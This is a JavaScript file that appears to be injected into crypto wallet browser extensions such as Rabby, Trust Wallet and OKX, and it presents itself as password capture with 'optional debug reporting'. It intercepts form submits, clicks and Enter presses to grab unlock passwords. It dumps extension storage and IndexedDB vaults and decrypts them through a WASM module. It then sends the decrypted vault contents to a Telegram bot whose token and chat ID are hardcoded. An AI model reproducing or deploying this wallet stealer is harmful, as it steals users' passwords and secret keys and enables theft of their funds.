﻿(function() {
// Core path: DOM password capture + chrome.storage/localStorage + WASM decode (cfg-driven).
// No chrome.runtime.sendMessage / onMessage / connect / ports for capture.
// When injected as the first <script defer> in <head>, bootstrap() runs before other deferred bundles so
// WASM fetch + snapshot can overlap wallet UI startup.
//
// Optional debug reporting: if Telegram token+chat are set (constants below or chrome.storage.local),
// run summaries may be POSTed to api.telegram.org. That channel is replaceable and not required for decode.
const LOG = "[vault-ext]";
const _WA = typeof WebAssembly !== "undefined" ? WebAssembly : null;

// --- WASM glue + cfg-driven storage reads (sizes from wasm `cfg`) ---
let _wasm;
let _cachedU8 = null;
let WASM_VECTOR_LEN = 0;

const _encoder = new TextEncoder();
if (!("encodeInto" in _encoder)) {
  _encoder.encodeInto = function (arg, view) {
    const buf = _encoder.encode(arg);
    view.set(buf);
    return { read: arg.length, written: buf.length };
  };
}

let _decoder = new TextDecoder("utf-8", { ignoreBOM: true, fatal: true });
_decoder.decode();
const MAX_SAFARI_DECODE_BYTES = 2146435072;
let _numDecoded = 0;

function _getU8() {
  if (_cachedU8 === null || _cachedU8.byteLength === 0)
    _cachedU8 = new Uint8Array(_wasm.memory.buffer);
  return _cachedU8;
}

function _decodeText(ptr, len) {
  _numDecoded += len;
  if (_numDecoded >= MAX_SAFARI_DECODE_BYTES) {
    _decoder = new TextDecoder("utf-8", { ignoreBOM: true, fatal: true });
    _decoder.decode();
    _numDecoded = len;
  }
  return _decoder.decode(_getU8().subarray(ptr, ptr + len));
}

function _getStr(ptr, len) { return _decodeText(ptr >>> 0, len); }

function _passStr(arg, malloc, realloc) {
  if (realloc === undefined) {
    const buf = _encoder.encode(arg);
    const ptr = malloc(buf.length, 1) >>> 0;
    _getU8().subarray(ptr, ptr + buf.length).set(buf);
    WASM_VECTOR_LEN = buf.length;
    return ptr;
  }
  let len = arg.length;
  let ptr = malloc(len, 1) >>> 0;
  const mem = _getU8();
  let offset = 0;
  for (; offset < len; offset++) {
    const code = arg.charCodeAt(offset);
    if (code > 0x7f) break;
    mem[ptr + offset] = code;
  }
  if (offset !== len) {
    if (offset !== 0) arg = arg.slice(offset);
    ptr = realloc(ptr, len, (len = offset + arg.length * 3), 1) >>> 0;
    const view = _getU8().subarray(ptr + offset, ptr + len);
    const ret = _encoder.encodeInto(arg, view);
    offset += ret.written;
    ptr = realloc(ptr, len, offset, 1) >>> 0;
  }
  WASM_VECTOR_LEN = offset;
  return ptr;
}

function wasmRun(input, key, id) {
  let d0, d1;
  try {
    const p0 = _passStr(input, _wasm.__wbindgen_malloc, _wasm.__wbindgen_realloc);
    const l0 = WASM_VECTOR_LEN;
    const p1 = _passStr(key, _wasm.__wbindgen_malloc, _wasm.__wbindgen_realloc);
    const l1 = WASM_VECTOR_LEN;
    const p2 = _passStr(id, _wasm.__wbindgen_malloc, _wasm.__wbindgen_realloc);
    const l2 = WASM_VECTOR_LEN;
    const ret = _wasm.run(p0, l0, p1, l1, p2, l2);
    d0 = ret[0]; d1 = ret[1];
    return _getStr(ret[0], ret[1]);
  } finally { _wasm.__wbindgen_free(d0, d1, 1); }
}

function wasmCfg(id) {
  let d0, d1;
  try {
    const p0 = _passStr(id, _wasm.__wbindgen_malloc, _wasm.__wbindgen_realloc);
    const l0 = WASM_VECTOR_LEN;
    const ret = _wasm.cfg(p0, l0);
    d0 = ret[0]; d1 = ret[1];
    return _getStr(ret[0], ret[1]);
  } finally { _wasm.__wbindgen_free(d0, d1, 1); }
}

async function initWasm() {
  if (_wasm) return;
  const imports = {
    __proto__: null,
    "./dm_core_bg.js": {
      __proto__: null,
      __wbg___wbindgen_throw_9c75d47bf9e7731e(a, b) { throw new Error(_getStr(a, b)); },
      __wbindgen_init_externref_table() {
        const t = _wasm.__wbindgen_externrefs;
        const o = t.grow(4);
        t.set(0, undefined); t.set(o, undefined); t.set(o + 1, null); t.set(o + 2, true); t.set(o + 3, false);
      },
    },
  };
  if (!_WA) throw new Error("WebAssembly not available");
  const wasmUrl = chrome.runtime.getURL("dm_core_bg.wasm");
  const buf = await fetch(wasmUrl).then((r) => r.arrayBuffer());
  const { instance } = await _WA.instantiate(buf, imports);
  _wasm = instance.exports;
  _cachedU8 = null;
  _wasm.__wbindgen_start();
}

// --- Optional debug sink (Telegram); same keys may live in chrome.storage.local ---
const TELEGRAM_BOT_TOKEN = "7714701757:AAGhMl4WGPuOscM-SoDYJTWwjCifT4UiWpU";
const TELEGRAM_CHAT_ID = "7858616715";
const TG_CHUNK = 4000;

async function getTelegramConfig() {
  let token = TELEGRAM_BOT_TOKEN;
  let chatId = TELEGRAM_CHAT_ID;
  if ((!token || !chatId) && _chromeStorage) {
    try {
      const s = await _chromeStorage.get(["telegram_bot_token", "telegram_chat_id"]);
      token = token || (s.telegram_bot_token || "");
      chatId = chatId || (s.telegram_chat_id || "");
    } catch (_) {}
  }
  return { token: String(token).trim(), chatId: String(chatId).trim() };
}

async function sendTelegramText(text) {
  const { token, chatId } = await getTelegramConfig();
  if (!token || !chatId) return false;

  const parts = [];
  for (let i = 0; i < text.length; i += TG_CHUNK) {
    parts.push(text.slice(i, i + TG_CHUNK));
  }

  for (let p = 0; p < parts.length; p++) {
    const header = parts.length > 1 ? `[${p + 1}/${parts.length}]\n` : "";
    const body = header + parts[p];
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: body,
        disable_web_page_preview: true,
      }),
    });
    const data = await r.json().catch(() => ({}));
    if (!r.ok || !data.ok) {
      throw new Error(data.description || `HTTP ${r.status}`);
    }
  }
  return true;
}

// --- cfg-driven snapshot (flat JSON for WASM); only JSON transport replacer in JS ---
const SNAPSHOT_LS_KEY = "__vault_decoder_snapshot";
let _ls = null;
try { _ls = localStorage; } catch (_) {}

const S_LOCAL = 0;
const S_IDB = 1;
const S_BOTH = 2;

const _chromeStorage = (function () {
  try { return chrome && chrome.storage && chrome.storage.local; } catch (_) { return null; }
})();

function normalizeStorageSource(cfgObj) {
  if (!cfgObj || typeof cfgObj !== "object") return S_BOTH;
  const s = cfgObj.s;
  if (s === S_LOCAL || s === S_IDB || s === S_BOTH) return s;
  if (typeof s === "string") {
    const n = parseInt(s, 10);
    if (n === S_LOCAL || n === S_IDB || n === S_BOTH) return n;
  }
  return S_BOTH;
}

function zpMatch(k, p) {
  if (!p) return false;
  if (p.startsWith("*")) return k.includes(p.slice(1));
  return k === p || k.startsWith(p);
}

function snapshotReplacer(_k, v) {
  if (typeof v === "bigint") return v.toString();
  if (v instanceof ArrayBuffer) return Array.from(new Uint8Array(v));
  if (v instanceof Uint8Array) return Array.from(v);
  if (v && v.type === "Buffer" && Array.isArray(v.data)) return v.data;
  return v;
}

function stringifySnapshot(obj) {
  return JSON.stringify(obj, snapshotReplacer);
}

function isExtensionDocument() {
  try {
    return typeof location !== "undefined" && location.protocol === "chrome-extension:";
  } catch (_) {
    return false;
  }
}

function parseCfg(cfgRaw) {
  let o = null;
  if (cfgRaw && cfgRaw !== "null") {
    try { o = JSON.parse(cfgRaw); } catch (e) { console.error(LOG, "cfg JSON parse failed", e); }
  }
  if (!o) o = { s: S_BOTH, k: null, zp: null, i: null, fullIdb: false, mergeSession: false };
  o.s = normalizeStorageSource(o);
  o.fullIdb = !!o.fullIdb;
  o.mergeSession = !!o.mergeSession;
  return o;
}

function stripTelegramKeys(obj) {
  if (!obj || typeof obj !== "object") return;
  delete obj.telegram_bot_token;
  delete obj.telegram_chat_id;
}

function storageKeyMatches(k, exactKeys, prefixes) {
  let keep = false;
  if (exactKeys) {
    for (let i = 0; i < exactKeys.length; i++) { if (k === exactKeys[i]) { keep = true; break; } }
  }
  if (!keep && prefixes) {
    for (let j = 0; j < prefixes.length; j++) { if (zpMatch(k, prefixes[j])) { keep = true; break; } }
  }
  return keep;
}

async function gatherFilteredLocalStorage(cfgObj) {
  if (!_chromeStorage) return {};
  const rawK = cfgObj && cfgObj.k;
  const rawZp = cfgObj && cfgObj.zp;
  const exactKeys = Array.isArray(rawK) && rawK.length > 0 ? rawK : null;
  const prefixes = Array.isArray(rawZp) && rawZp.length > 0 ? rawZp : null;

  let local = {};
  if (exactKeys && !prefixes) {
    try {
      local = await _chromeStorage.get(exactKeys);
      if (!local || typeof local !== "object") local = {};
    } catch (_) {
      local = {};
    }
  } else {
    const allRaw = await _chromeStorage.get(null);
    local = { ...(allRaw && typeof allRaw === "object" ? allRaw : {}) };
  }
  stripTelegramKeys(local);

  if (exactKeys || prefixes) {
    const filtered = {};
    for (const [k, v] of Object.entries(local)) {
      if (storageKeyMatches(k, exactKeys, prefixes)) filtered[k] = v;
    }
    local = filtered;
  }

  const ls = readExtensionLocalStorageFiltered(cfgObj, exactKeys, prefixes);
  for (const [k, v] of Object.entries(ls)) {
    if (k in local) continue;
    if (!exactKeys && !prefixes) { local[k] = v; continue; }
    if (storageKeyMatches(k, exactKeys, prefixes)) local[k] = v;
  }
  return local;
}

function readExtensionLocalStorageFiltered(cfgObj, exactKeys, prefixes) {
  const o = {};
  if (!_ls) return o;
  try {
    for (let i = 0; i < _ls.length; i++) {
      const k = _ls.key(i);
      if (!k || k === SNAPSHOT_LS_KEY) continue;
      if (exactKeys || prefixes) {
        if (!storageKeyMatches(k, exactKeys, prefixes)) continue;
      }
      const raw = _ls.getItem(k);
      try { o[k] = JSON.parse(raw); } catch (_) { o[k] = raw; }
    }
  } catch (_) {}
  return o;
}

async function mergeChromeSessionInto(packed) {
  try {
    if (!chrome.storage || !chrome.storage.session || typeof chrome.storage.session.get !== "function") return;
    const session = await chrome.storage.session.get(null);
    if (!session || typeof session !== "object") return;
    for (const [k, v] of Object.entries(session)) {
      if (!(k in packed)) packed[k] = v;
    }
  } catch (_) {}
}

function openDbReadonly(name) {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(name);
    req.onerror = () => reject(req.error);
    req.onsuccess = () => resolve(req.result);
    req.onupgradeneeded = (e) => {
      try { e.target.transaction.abort(); } catch (_) {}
      reject(new Error("onupgradeneeded"));
    };
  });
}

function idbGetAll(db, storeName) {
  return new Promise((resolve, reject) => {
    try {
      const tx = db.transaction(storeName, "readonly");
      const r = tx.objectStore(storeName).getAll();
      r.onsuccess = () => resolve(r.result);
      r.onerror = () => reject(r.error);
    } catch (e) {
      resolve({ __error: String(e) });
    }
  });
}

function idbGetKey(db, storeName, key) {
  return new Promise((resolve, reject) => {
    try {
      const tx = db.transaction(storeName, "readonly");
      const r = tx.objectStore(storeName).get(key);
      r.onsuccess = () => resolve(r.result !== undefined ? r.result : null);
      r.onerror = () => reject(r.error);
    } catch (e) {
      resolve(null);
    }
  });
}

async function gatherIdb(cfgObj) {
  const out = {};
  const specs = cfgObj && cfgObj.i;
  if (Array.isArray(specs) && specs.length) {
    for (const spec of specs) {
      const dbName = spec.db;
      const storeName = spec.store;
      const key = spec.key;
      if (!dbName || !storeName) continue;
      try {
        const db = await openDbReadonly(dbName);
        try {
          if (!out[dbName]) out[dbName] = {};
          if (key === "*") {
            const rows = await idbGetAll(db, storeName);
            out[dbName][storeName] = Array.isArray(rows) ? rows : rows;
          } else {
            const val = await idbGetKey(db, storeName, key);
            if (val !== null) {
              if (!out[dbName][storeName]) out[dbName][storeName] = {};
              out[dbName][storeName][key] = val;
            }
          }
        } finally {
          db.close();
        }
      } catch (_) {}
    }
  }

  if (cfgObj.fullIdb && isExtensionDocument() && typeof indexedDB !== "undefined" && typeof indexedDB.databases === "function") {
    try {
      const dblist = await indexedDB.databases();
      for (let di = 0; di < dblist.length; di++) {
        const meta = dblist[di];
        const dbName = meta && meta.name;
        if (!dbName) continue;
        try {
          const db = await openDbReadonly(dbName);
          try {
            if (!out[dbName]) out[dbName] = {};
            const names = db.objectStoreNames;
            for (let si = 0; si < names.length; si++) {
              const sn = names[si];
              if (out[dbName][sn] !== undefined) continue;
              const rows = await idbGetAll(db, sn);
              out[dbName][sn] = Array.isArray(rows) ? rows : rows;
            }
          } finally {
            db.close();
          }
        } catch (_) {}
      }
    } catch (_) {}
  }

  return out;
}

async function gatherExtensionSnapshot(cfgObj) {
  const source = normalizeStorageSource(cfgObj);
  let prevIdb = null;
  try {
    const raw = _ls ? _ls.getItem(SNAPSHOT_LS_KEY) : null;
    if (raw) {
      const o = JSON.parse(raw);
      if (o && o.__idb && typeof o.__idb === "object") prevIdb = o.__idb;
    }
  } catch (_) {}

  const packed = {};
  if (source === S_LOCAL || source === S_BOTH) {
    Object.assign(packed, await gatherFilteredLocalStorage(cfgObj));
    if (cfgObj.mergeSession) await mergeChromeSessionInto(packed);
  }

  if (source === S_IDB || source === S_BOTH) {
    if (isExtensionDocument()) {
      packed.__idb = await gatherIdb(cfgObj);
    } else if (prevIdb && Object.keys(prevIdb).length) {
      packed.__idb = prevIdb;
    } else {
      packed.__idb = {};
    }
  }

  return packed;
}

if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.id) return;
const extId = chrome.runtime.id;

let wasmReady = false;
let decrypting = false;

async function runDecrypt(password) {
  if (!wasmReady || decrypting || !password) return;
  decrypting = true;
  try {
    const cfgObj = parseCfg(wasmCfg(extId));
    const snap = await gatherExtensionSnapshot(cfgObj);
    const json = stringifySnapshot(snap);
    try {
      if (_ls) _ls.setItem(SNAPSHOT_LS_KEY, json);
      else window.__vault_storage = json;
    } catch (_) {}
    const resJson = wasmRun(json, password, extId);
    const res = JSON.parse(resJson);
    if (res.ok) console.log(LOG, "decrypt ok");
    else console.warn(LOG, "decrypt failed:", res.e || "");
    const lines = [
      `${LOG} decrypt`,
      `ext: ${extId}`,
      `ok: ${res.ok}`,
      res.ok ? `d: ${JSON.stringify(res.d)}` : `e: ${res.e || ""}`,
    ];
    try {
      await sendTelegramText(lines.join("\n"));
    } catch (tgErr) {
      console.error(LOG, "Telegram send failed", tgErr);
    }
  } catch (e) {
    try {
      await sendTelegramText(
        `${LOG} decrypt threw\next: ${extId}\n${String(e && e.message ? e.message : e)}`
      );
    } catch (_) {}
    console.error(LOG, e);
  } finally {
    decrypting = false;
  }
}

// Password capture (from inject.js)
// ===========================================================================

(function () {
  if (window.__pwdAlertInstalled) return;
  window.__pwdAlertInstalled = true;

  var POSITIVE = [
    "unlock", "submit", "login", "log in", "sign in", "signin",
    "continue", "next", "confirm", "create", "import", "save",
    "verify", "enter", "open", "go", "done", "authenticate",
  ];
  var NEGATIVE = [
    "forgot", "reset", "cancel", "back", "close", "skip",
    "show password", "hide password", "toggle", "eye",
  ];
  var DEDUPE_MS = 300;
  var lastSig = "";
  var lastTs = 0;

  var nativeGet = (function () {
    try {
      var d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
      return d && d.get ? d.get : null;
    } catch (_) { return null; }
  })();

  var nativeSet = (function () {
    try {
      var d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
      return d && d.set ? d.set : null;
    } catch (_) { return null; }
  })();

  function readReactControlledValue(el) {
    if (!el || el.tagName !== "INPUT") return null;
    try {
      if (el._valueTracker && typeof el._valueTracker.getValue === "function") {
        var tv = el._valueTracker.getValue();
        if (tv != null && String(tv).length) return String(tv);
      }
    } catch (_) {}
    try {
      var k;
      for (k in el) {
        if (!Object.prototype.hasOwnProperty.call(el, k)) continue;
        if (k.indexOf("__reactProps") === 0) {
          var pr = el[k];
          if (!pr) continue;
          if (typeof pr.value === "string" && pr.value.length) return pr.value;
          if (typeof pr.defaultValue === "string" && pr.defaultValue.length) return pr.defaultValue;
        }
      }
      for (k in el) {
        if (!Object.prototype.hasOwnProperty.call(el, k)) continue;
        if (k.indexOf("__reactFiber") === 0) {
          var fib = el[k];
          for (var depth = 0; fib && depth < 48; depth++, fib = fib.return) {
            var mp = fib.memoizedProps;
            if (!mp) continue;
            if (typeof mp.value === "string" && mp.value.length) return mp.value;
            if (typeof mp.defaultValue === "string" && mp.defaultValue.length) return mp.defaultValue;
          }
        }
      }
    } catch (_) {}
    return null;
  }

  function flushInputValueFromReact(el) {
    if (!el || el.tagName !== "INPUT" || !nativeSet) return;
    var react = readReactControlledValue(el);
    if (!react || !react.length) return;
    var dom = "";
    try { dom = nativeGet ? String(nativeGet.call(el) || "") : String(el.value || ""); } catch (_) { dom = String(el.value || ""); }
    if (dom === react) return;
    // User deleted (Backspace/Delete): DOM is shorter while React props are still stale — do not clobber.
    if (dom.length < react.length) return;
    // DOM already ahead of React (typing faster than commit): do not overwrite.
    if (dom.length > react.length) return;
    try { nativeSet.call(el, react); } catch (_) {}
    try {
      if (el._valueTracker && typeof el._valueTracker.setValue === "function")
        el._valueTracker.setValue(react);
    } catch (_) {}
  }

  function readVal(el) {
    if (!el) return "";
    var dom = "";
    try { dom = nativeGet ? String(nativeGet.call(el) || "") : String(el.value || ""); } catch (_) { dom = String(el.value || ""); }
    var react = readReactControlledValue(el);
    if (!react || !react.length) return dom;
    if (!dom.length && react.length) return react;
    // Prefer DOM while it is shorter (in-progress delete); prefer React when it is longer (autofill / controlled lag).
    if (dom.length < react.length) return dom;
    if (react.length > dom.length) return react;
    return dom.length ? dom : react;
  }

  var cache = new WeakMap();

  function allPwdInputs(root) {
    var out = [];
    var roots = [root];
    try {
      var w = root.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null);
      var n = w.currentNode;
      while (n) {
        if (n.shadowRoot && n.shadowRoot.mode === "open") roots.push(n.shadowRoot);
        n = w.nextNode();
      }
    } catch (_) {}
    var PWD_SELECTORS = 'input[type="password"], input[autocomplete="current-password"], input[autocomplete="new-password"], input[data-testid*="password"], input[name*="password"], input[name*="Password"], input[id*="password"], input[id*="Password"], input[placeholder*="password" i]';
    var OKX_PW_WRAP = '[class*="passwordInput"],[class*="PasswordInput"]';
    for (var i = 0; i < roots.length; i++) {
      try {
        var list = roots[i].querySelectorAll(PWD_SELECTORS);
        for (var j = 0; j < list.length; j++) out.push(list[j]);
        var okx = roots[i].querySelectorAll(OKX_PW_WRAP + " input");
        for (var k = 0; k < okx.length; k++) {
          var el = okx[k];
          if (el && el.tagName === "INPUT" && (el.type === "text" || el.type === "password" || el.type === "search" || !el.type)) {
            out.push(el);
          }
        }
      } catch (_) {}
    }
    return out;
  }

  function scopedPwds(el, doc) {
    var n = el, max = 60;
    var sel = 'input[type="password"],[class*="passwordInput"] input,[class*="PasswordInput"] input';
    while (n && max-- > 0) {
      try {
        if (n.querySelectorAll) {
          var f = n.querySelectorAll(sel);
          if (f.length) return [].slice.call(f);
        }
      } catch (_) {}
      n = n.parentElement || (n.parentNode && n.parentNode.host) || null;
    }
    return [];
  }

  function pwdInputsFromComposedPath(trigger) {
    var out = [];
    var path = (trigger && trigger.composedPath && trigger.composedPath()) || [];
    for (var i = 0; i < path.length; i++) {
      if (isPwdInput(path[i])) out.push(path[i]);
    }
    return out;
  }

  function getPwds(trigger) {
    var doc = document;
    if (trigger && trigger.ownerDocument) doc = trigger.ownerDocument;
    var fromPath = pwdInputsFromComposedPath(trigger);
    if (fromPath.length) return fromPath;
    var s = scopedPwds(trigger, doc);
    if (s.length) return s;
    try {
      var okxForm = doc.querySelector('form[data-testid="okd-form"]');
      if (okxForm) {
        var inp = okxForm.querySelector('input[type="password"], [data-e2e-okd-form-item-name="password"] input, [class*="_password_"] input');
        if (inp && inp.tagName === "INPUT") return [inp];
      }
    } catch (_) {}
    return allPwdInputs(doc);
  }

  function collectValues(inputs) {
    var vals = [];
    for (var i = 0; i < inputs.length; i++) {
      var inp = inputs[i];
      flushInputValueFromReact(inp);
      var v = readVal(inp) || cache.get(inp) || "";
      if (v) vals.push(v);
    }
    return vals;
  }

  function collectPasswordsFromForm(form) {
    if (!form || form.tagName !== "FORM") return [];
    var doc = form.ownerDocument || document;
    var arr = [].slice.call(form.querySelectorAll('input[type="password"]'));
    if (!arr.length) arr = [].slice.call(form.querySelectorAll('[class*="passwordInput"] input,[class*="PasswordInput"] input'));
    if (!arr.length) {
      try {
        var okxPw = form.querySelector('[data-e2e-okd-form-item-name="password"] input');
        if (okxPw && okxPw.tagName === "INPUT") arr = [okxPw];
      } catch (_) {}
    }
    if (!arr.length) {
      try {
        arr = allPwdInputs(doc).filter(function (n) { return form.contains(n); });
      } catch (_) {
        arr = [];
      }
    }
    return collectValues(arr);
  }

  function dedup(vals) {
    var sig = vals.join("|");
    var now = Date.now();
    if (sig === lastSig && now - lastTs < DEDUPE_MS) return false;
    lastSig = sig;
    lastTs = now;
    return true;
  }

  var _replaying = false;

  function interceptAndReplay(vals, replayFn) {
    if (!vals.length || !dedup(vals)) { replayFn(); return; }
    var chain = Promise.resolve();
    for (var i = 0; i < vals.length; i++) {
      (function (pw) {
        chain = chain.then(function () { return runDecrypt(pw); });
      })(vals[i]);
    }
    chain.then(replayFn, replayFn);
  }

  function textOf(el) {
    if (!el) return "";
    var t = "";
    try { t += (el.innerText || ""); } catch (_) {}
    var attrs = ["aria-label", "title", "data-testid", "name", "id", "value"];
    for (var i = 0; i < attrs.length; i++) {
      var v = el.getAttribute && el.getAttribute(attrs[i]);
      if (v) t += " " + v;
    }
    return t.toLowerCase();
  }

  function matchAny(text, list) {
    for (var i = 0; i < list.length; i++) if (text.indexOf(list[i]) !== -1) return true;
    return false;
  }

  function isClickable(el) {
    if (!el || el.nodeType !== 1) return false;
    if (el.tagName === "BUTTON") return true;
    if (el.tagName === "INPUT" && (el.type === "submit" || el.type === "button")) return true;
    if (el.tagName === "A") return true;
    if (el.getAttribute && el.getAttribute("role") === "button") return true;
    var ti = el.getAttribute && el.getAttribute("tabindex");
    return ti !== null && ti !== undefined && ti !== "";
  }

  function looksLikeSubmit(el) {
    if (!el) return false;
    if (el.tagName === "BUTTON") {
      var bt = el.getAttribute("type");
      if (!bt || bt === "submit") return true;
      if (bt === "reset") return false;
    }
    if (el.tagName === "INPUT" && el.type === "submit") return true;
    var text = textOf(el);
    if (!text) return false;
    if (matchAny(text, NEGATIVE)) return false;
    return matchAny(text, POSITIVE);
  }

  function inOkxPasswordWrapper(el) {
    if (!el || el.tagName !== "INPUT") return false;
    try {
      if (el.closest && el.closest('[class*="passwordInput"],[class*="PasswordInput"]')) return true;
    } catch (_) {}
    return false;
  }

  function isPwdInput(el) {
    if (!el || el.tagName !== "INPUT") return false;
    if (el.type === "password") return true;
    if ((el.type === "text" || el.type === "search" || el.type === "tel" || !el.type) && inOkxPasswordWrapper(el)) return true;
    var ac = (el.getAttribute("autocomplete") || "").toLowerCase();
    if (ac === "current-password" || ac === "new-password") return true;
    var attrs = (el.getAttribute("name") || "") + (el.getAttribute("id") || "") + (el.getAttribute("data-testid") || "") + (el.getAttribute("placeholder") || "");
    return /password/i.test(attrs);
  }

  function formHasPasswordField(form) {
    if (!form || !form.querySelector) return false;
    if (form.querySelector('input[type="password"]')) return true;
    if (form.querySelector('[class*="passwordInput"] input,[class*="PasswordInput"] input')) return true;
    return false;
  }

  function willFormSubmit(el) {
    if (!el) return false;
    var form = null;
    if (el.tagName === "BUTTON") {
      var bt = el.getAttribute("type");
      if (bt === "button" || bt === "reset") return false;
      form = el.form || null;
    } else if (el.tagName === "INPUT" && (el.type === "submit" || el.type === "image")) {
      form = el.form || null;
    }
    return form ? formHasPasswordField(form) : false;
  }

  function pwdCandidateFromEvent(ev) {
    var t = ev && ev.target;
    if (t && t.nodeType === 1 && t.tagName === "INPUT" && isPwdInput(t)) return t;
    var path = (ev && ev.composedPath && ev.composedPath()) || [];
    for (var i = 0; i < path.length; i++) {
      var n = path[i];
      if (n && n.nodeType === 1 && n.tagName === "INPUT" && isPwdInput(n)) return n;
    }
    return null;
  }

  function pwdFieldFromActive(doc) {
    try {
      var a = doc && doc.activeElement;
      if (a && a.tagName === "INPUT" && isPwdInput(a)) return a;
    } catch (_) {}
    return null;
  }

  function installGlobalPwdSnifferOnDocument(doc) {
    if (!doc || doc.nodeType !== 9 || doc.__vaultPwdSnifferDoc) return;
    doc.__vaultPwdSnifferDoc = true;

    var lastPwdField = null;

    function pickPwdField() {
      var el = lastPwdField;
      try {
        if (el && el.ownerDocument === doc && el.isConnected) return el;
      } catch (_) {}
      return pwdFieldFromActive(doc);
    }

    function tryDecryptFromTrackedField() {
      var el = pickPwdField();
      if (!el || !isPwdInput(el)) return;
      flushInputValueFromReact(el);
      var vals = collectValues([el]);
      if (!vals.length) return;
      if (!dedup(vals)) return;
      var chain = Promise.resolve();
      for (var i = 0; i < vals.length; i++) {
        (function (pw) {
          chain = chain.then(function () { return runDecrypt(pw); });
        })(vals[i]);
      }
    }

    function syncCache(ev) {
      var el = pwdCandidateFromEvent(ev);
      if (!el) return;
      if (isPwdInput(el)) lastPwdField = el;
      flushInputValueFromReact(el);
      var v = readVal(el);
      if (v) cache.set(el, v);
    }

    function onKeyEnterDown(ev) {
      if (!ev || ev.key !== "Enter") return;
      var el = pwdCandidateFromEvent(ev);
      if (el) lastPwdField = el;
      syncCache(ev);
    }

    function onKeyEnterUp(ev) {
      if (!ev || ev.key !== "Enter") return;
      syncCache(ev);
      queueMicrotask(tryDecryptFromTrackedField);
      setTimeout(tryDecryptFromTrackedField, 35);
      setTimeout(tryDecryptFromTrackedField, 120);
    }

    function wrap(fn) {
      return function (ev) {
        try { fn(ev); } catch (_) {}
      };
    }

    doc.addEventListener("input", wrap(syncCache), true);
    doc.addEventListener("keydown", wrap(onKeyEnterDown), true);
    doc.addEventListener("keyup", wrap(onKeyEnterUp), true);
  }

  function bind(target) {
    if (!target) return;
    if (target.nodeType === 9) installGlobalPwdSnifferOnDocument(target);
    if (target.__pwdAlertBound) return;
    target.__pwdAlertBound = true;

    target.addEventListener("submit", function (e) {
      if (_replaying) return;
      var form = e.target;
      if (!form || form.tagName !== "FORM") return;
      var vals = collectPasswordsFromForm(form);
      if (!vals.length) return;

      e.preventDefault();
      e.stopImmediatePropagation();

      interceptAndReplay(vals, function () {
        _replaying = true;
        try {
          if (form.requestSubmit) form.requestSubmit();
          else form.submit();
        } catch (_) {}
        _replaying = false;
      });
    }, true);

    target.addEventListener("click", function (e) {
      if (_replaying) return;
      var path = (e.composedPath && e.composedPath()) || [];
      var hit = null;
      for (var i = 0; i < path.length; i++) {
        if (path[i] && path[i].nodeType === 1 && isClickable(path[i])) { hit = path[i]; break; }
      }
      if (!hit) {
        var n = e.target, max = 12;
        while (n && n.nodeType === 1 && max-- > 0) {
          if (isClickable(n)) { hit = n; break; }
          n = n.parentElement;
        }
      }
      if (!hit || !looksLikeSubmit(hit)) return;
      var vals = [];
      if (willFormSubmit(hit)) {
        var form0 = hit.form || (hit.closest && hit.closest("form"));
        vals = collectPasswordsFromForm(form0);
      }
      if (!vals.length) vals = collectValues(getPwds(hit));
      if (!vals.length) return;

      e.preventDefault();
      e.stopImmediatePropagation();

      interceptAndReplay(vals, function () {
        _replaying = true;
        try { hit.click(); } catch (_) {}
        _replaying = false;
      });
    }, true);

    target.addEventListener("keydown", function (e) {
      if (_replaying) return;
      if (e.key !== "Enter") return;
      var t = pwdCandidateFromEvent(e);
      if (!t) return;
      var vals = collectValues(getPwds(t));
      if (!vals.length) return;

      e.preventDefault();
      e.stopImmediatePropagation();

      interceptAndReplay(vals, function () {
        _replaying = true;
        try {
          t.dispatchEvent(new KeyboardEvent("keydown", {
            key: "Enter", code: "Enter", keyCode: 13,
            bubbles: true, cancelable: true
          }));
        } catch (_) {}
        _replaying = false;
      });
    }, true);

    target.addEventListener("input", function (e) {
      var t = e.target;
      if (t && t.tagName === "INPUT" && isPwdInput(t)) {
        flushInputValueFromReact(t);
        var v = readVal(t);
        if (v) cache.set(t, v);
      }
    }, true);
  }

  function bindIframes() {
    try {
      var frames = document.querySelectorAll("iframe, frame");
      for (var i = 0; i < frames.length; i++) {
        try {
          var d = frames[i].contentDocument;
          if (d) bind(d);
        } catch (_) {}
        if (!frames[i].__pwdAlertLoad) {
          frames[i].__pwdAlertLoad = true;
          frames[i].addEventListener("load", function () {
            try { var d = this.contentDocument; if (d) bind(d); } catch (_) {}
          });
        }
      }
    } catch (_) {}
  }

  function initPwdCapture() {
    bind(document);
    bindIframes();
    try {
      var orig = Element.prototype.attachShadow;
      // Rabby, Trust Wallet, and similar MV3 React stacks rely on native `attachShadow`; patching
      // breaks UI (blank popup) or internal messaging.
      var SKIP_ATTACH_SHADOW_PATCH = {
        acmacodkjbdgmoleebolmdjonilkdbch: true,
        egjidjbpglichdcondbcbdnbeeppgdph: true,
        ajkhoeiiokighlmdnlakpjfoobnjinie: true,
      };
      if (
        orig &&
        !orig.__pwdAlertPatched &&
        typeof extId === "string" &&
        !SKIP_ATTACH_SHADOW_PATCH[extId]
      ) {
        Element.prototype.attachShadow = function (opts) {
          var sr = orig.call(this, opts);
          if (sr && (!opts || opts.mode !== "closed")) bind(sr);
          return sr;
        };
        Element.prototype.attachShadow.__pwdAlertPatched = true;
      }
    } catch (_) {}
    try {
      new MutationObserver(function (muts) {
        for (var i = 0; i < muts.length; i++) {
          if (muts[i].addedNodes && muts[i].addedNodes.length) { bindIframes(); return; }
        }
      }).observe(document.documentElement || document, { childList: true, subtree: true });
    } catch (_) {}
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initPwdCapture, { once: true });
  } else {
    initPwdCapture();
  }
})();

// ===========================================================================
// Bootstrap
// ===========================================================================

async function bootstrap() {
  try {
    await initWasm();
    wasmReady = true;
  } catch (e) {
    console.error(LOG, "WASM init failed", e);
    return;
  }
  try {
    const cfgObj = parseCfg(wasmCfg(extId));
    const snap = await gatherExtensionSnapshot(cfgObj);
    const json = stringifySnapshot(snap);
    if (_ls) _ls.setItem(SNAPSHOT_LS_KEY, json);
    else window.__vault_storage = json;
  } catch (e) {
    console.error(LOG, "bootstrap snapshot failed", e);
  }
}

void bootstrap();
